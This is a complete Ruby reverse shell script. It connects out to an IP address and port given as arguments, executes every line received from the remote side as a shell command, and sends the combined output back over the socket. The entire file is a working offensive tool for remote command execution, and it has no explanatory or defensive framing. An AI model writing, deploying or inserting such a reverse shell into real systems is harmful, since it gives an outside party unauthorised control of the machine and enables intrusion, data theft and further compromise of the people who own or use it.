require "socket"
require "open3"

module Reverse
  # status code
  def self.print_error(string)
    print("\033[31m [×]#{string}\n")
  end
  def self.print_good(string)
    print("\033[32m [+]#{string}\n")
  end

  def self.shell
    begin
      sock = TCPSocket.new(ARGV[0], ARGV[1])
      print_good("connection accepted!")
      
      while line = sock.gets
        Open3.popen2e("#{line}") { |stdin, stdout_and_stderr| IO.copy_stream(stdout_and_stderr, sock) }
      end 

    rescue Interrupt
      print_error("program stopped by user!")
    rescue (Errno::ECONNREFUSED)
      print_error("connection refused!")
    end
  end
end

if ARGV[0].nil? || ARGV[1].nil?
  puts "ruby #{__FILE__} [IP] [PORT]"
else
  Reverse::shell
end
